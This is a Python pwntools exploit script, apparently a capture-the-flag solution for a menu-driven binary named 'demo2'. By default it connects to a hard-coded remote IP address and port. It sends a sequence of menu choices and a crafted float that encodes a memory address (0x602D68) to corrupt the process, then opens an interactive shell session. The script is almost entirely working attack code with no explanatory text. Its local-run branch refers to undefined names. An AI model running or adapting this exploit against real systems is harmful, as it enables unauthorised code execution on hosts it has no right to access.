#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./demo2 --host 127.0.0.1 --port 1234
from pwn import *
from struct import unpack
import random, time
import re
from math import sqrt
import struct
# Set up pwntools for the correct architecture

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11728)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments
io = start()
io.recvuntil(b'choice:')
io.sendline(b'a')
io.recvuntil(b':')
io.sendline('5')
io.recvuntil(b":")
for i in range(5):
    io.sendline('12')
io.recvuntil(b"choice:")
io.sendline('r')
io.recvuntil(b":")
io.sendline('0')
io.recvuntil(b":")
io.sendline('a')
io.recvuntil(b":")
io.sendline('3')
print(struct.unpack("d",p64(0x602D68)))
io.sendline(str(struct.unpack("d",p64(0x602D68)))[1:-2])
io.sendline('0')
io.sendline('0')
io.recvuntil(b":")
io.sendline('d')
io.recvuntil(b":")
io.sendline('0')
io.interactive()